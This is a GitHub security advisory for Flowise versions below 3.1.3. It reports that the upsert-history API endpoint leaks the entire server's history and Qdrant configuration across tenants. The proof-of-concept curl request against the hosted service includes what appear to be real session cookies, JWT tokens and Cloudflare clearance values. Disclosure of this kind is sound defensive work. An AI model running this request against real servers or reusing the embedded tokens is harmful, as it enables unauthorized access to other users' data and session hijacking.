# [H] Flowise: Information Disclosure in GET /api/v1/upsert-history returns the entire server-wide upsert history

## Summary
Severity: High
Advisory: GHSA-fr6g-7cq8-fg82
CVE: CVE-2026-70473
CWE: CWE-200, CWE-202, CWE-862
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:L/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-fr6g-7cq8-fg82
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3

## Details
### Summary
The **GET `/api/v1/upsert-history`** endpoint returns the **entire server-wide upsert history** (response size **>100MB**) instead of being scoped to the requesting user/tenant/workspace. The response includes **sensitive configuration data** (e.g., Vector Store settings such as **Qdrant Server URL** and **collection name**), resulting in a **High severity information disclosure** that may enable further targeted attacks.

### Details
- **Affected endpoint:** `GET /api/v1/upsert-history`
- **Observed behavior:** The API returns **global upsert history for the whole server**, indicating missing/insufficient:
  - Authorization checks (RBAC/user-based access control)
  - Data scoping (workspace/project/tenant isolation)
  - Pagination/limits (excessive data exposure and very large responses)
- **Sensitive data exposure:** The returned history contains integration parameters and infrastructure details. Example excerpt from the response:
  ```json
  {
    "label": "Qdrant",
    "name": "qdrant",
    "category": "Vector Stores",
    "id": "qdrant_0",
    "paramValues": [
      {
        "label": "Qdrant Server URL",
        "name": "qdrantServerUrl",
        "type": "string",
        "value": "https://7f60f255-f7fd-4a1c-a734-fbcf904f9f85.europe-west3-0.gcp.cloud.qdrant.io"
      },
      {
        "label": "Qdrant Collection Name",
        "name": "qdrantCollection",
        "type": "string",
        "value": "fair-herring-azure"
      },
      {
        "label": "Vector Dimension",
        "name": "qdrantVectorDimension",
        "type": "number",
        "value": 1536
      },
      {
        "label": "Content Key",
        "name": "contentPayloadKey",
        "type": "string",
        "value": "content"
      },
      {
        "label": "Metadata Key",
        "name": "metadataPayloadKey",
        "type": "string",
        "value": "metadata"
      },
      {
        "label": "Similarity",
        "name": "qdrantSimilarity",
        "type": "options",
        "value": "Cosine"
      }
    ]
  }

### POC 

1. Using `curl` and call the enpoint `GET  /api/v1/upsert-history`, sever returns the **entire server-wide upsert history**
```
curl 'https://cloud.flowiseai.com/api/v1/upsert-history'   -X GET   -H 'Host: cloud.flowiseai.com'   -H 'Accept: application/json, text/plain, */*'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'   -H 'X-Request-From: internal'   -H 'Referer: https://cloud.flowiseai.com/document-stores/vector/27d7e649-72c9-4333-836f-0a32b7ecda57/719bc75c-5810-4d22-aa03-35c7831b8819'   -H 'If-None-Match: W/"156-Xbc+zqRKlJRZDUydYMybuU4SQnY"'   -H 'Connection: keep-alive'   -H 'Cookie: _ga_DG9QMLV4DR=GS2.1.s1773632276$o1$g0$t1773632915$j60$l0$h0; _ga=GA1.1.938844242.1773632276; cf_clearance=Ug4PTMCbO8G.9n7ibaRBT.Y74flswLTgbR6V4qQbKUE-1773715307-1.2.1.1-2XGkql2bE8imFOsQJuw0x8yM9XW7QWbEe8ALEZ39Bm03kZu.vJLusY5_cRurAooKcK0XuqTjWgibQXYwWF91LbQZIXFefNzXuz6f8O7VzY5VM_h9p0_xICarIdDdB0hWfriItN1qbu00tqEmDgE_v2biNpNETXF3nC0wByJmhNWOcSh95lBd_Q5vALJQ0hc7pzhbPh.OuLbLtcCOlEv1YbwZWMSynj3hglpCeVkWqkM; connect.sid=s%3Axrkhl0YSNjvydmo24ASe3ezLStuedRCv.JABLEZmfWP74D9zGvFyDEELHFXqvDxHRnN3mJBhsKX8; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJlNGUwYTI4LTNkMWEtNDc0Ny05NmYzLWI1YzE1YTA1NDg4YyIsInVzZXJuYW1lIjoiVHJ1b25nIE5ndXllbiIsIm1ldGEiOiJhYjFiNzVjZTNmZmMyMzAzMTMwMmYwOGQ2MzU2YjQ3NjoxMTUzNzk3NDU1YTRhMmVhMDc3YWM0ODExNmRjMjhiOTNmZDlmMzg0OTAxZjhlNDliZTk2NjczMGM3N2YyZTc0ZjVkODNkYTJjMjNlOWZjNWM5ZDdmYzQ1ZDY2MmM0NWQwZWQ3MTMzYmZiZTA1MTAxZGRjNjY4OGYxZTJiNDZjNWU2YjU5OTdjMmE3OWVjNjc2MWU5NDZhYTkyNjg3MDY4IiwiaWF0IjoxNzczNzEzNTk0LCJuYmYiOjE3NzM3MTM1OTQsImV4cCI6MTc3MzczNTE5NCwiYXVkIjoiQVVESUVOQ0UiLCJpc3MiOiJJU1NVRVIifQ.UDFurQPA6-bKQ7mZg0Qetu6yAv1UK3vaz27ZUhUoamc; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJlNGUwYTI4LTNkMWEtNDc0Ny05NmYzLWI1YzE1YTA1NDg4YyIsInVzZXJuYW1lIjoiVHJ1b25nIE5ndXllbiIsIm1ldGEiOiJhNmU2MjJjNmFiMWU1MWEwYzcwNmViOWVkODA2MDFmZjpjYjIyN2ZhMjA4ZDIwYjk0NjAxMjFlNDhkZTZjZDg4Yzk0NmMwNzBjZjhhMGYwNDBlNzEzOTkzOTkyMzNmZWQ3ZWViNjk0ZmE3NGY4MGJkOTA1ZjZkM2I2Y2FlYmI5YmRjMWQ3YTgxZjMxNzBkYjI5MDJlMGYzNmZiN2I0ZDc2YWRkNjkzZmI5YWE5OGNjYjc1ZWI0OGVmMjBjMWNjNmU4IiwiaWF0IjoxNzczNjMzMDA0LCJuYmYiOjE3NzM2MzMwMDQsImV4cCI6MTc3NjIyNTAwNCwiYXVkIjoiQVVESUVOQ0UiLCJpc3MiOiJJU1NVRVIifQ.0HlslRzoFo0Tlt4Jbn9gnEwsQej4ilMd8qjhLBZQO5Q; __cf_bm=.BG97WtFqwwk0DMVJB1BlcHRdhQv70bLu4f_QpH5qo4-1773721030-1.0.1.1-IwhUPW6O9uNcNsOZl7LLgpnm8_ll18rzoOFu085wZQQgTvVvaPwVFJObxSJ1.NRyS5MWsRbJi1BhUNMTJjSR2s9EyuSBzn2s_eXblq8rTh8'   --compressed   -sS -o resp.json
```
2. Verify the response size (expected: very large, e.g., >100MB)
```
ls -lh resp.json
```

### Impact
- **Vulnerability type:** Information Disclosure / Broken Access Control (missing authorization and/or missing tenant/workspace scoping)
- **Who is impacted:** All users/tenants/workspaces whose upsert history and configuration data are included in the server-wide history
- **Security consequences:**
  - Exposure of infrastructure/integration details (e.g., Qdrant endpoint URLs, collection names, vector dimensions), enabling reconnaissance and targeted follow-up attacks
  - Leakage of internal schema/pipeline details (e.g., content/metadata keys)
  - Potential resource abuse: repeated downloads of a >100MB response can increase bandwidth/CPU/memory load (amplifying DoS risk)

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-fr6g-7cq8-fg82
- https://github.com/FlowiseAI/Flowise/pull/6170
- https://github.com/FlowiseAI/Flowise/commit/d81483b70c997ddf981acc9c49fbd9a02fa345cd
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
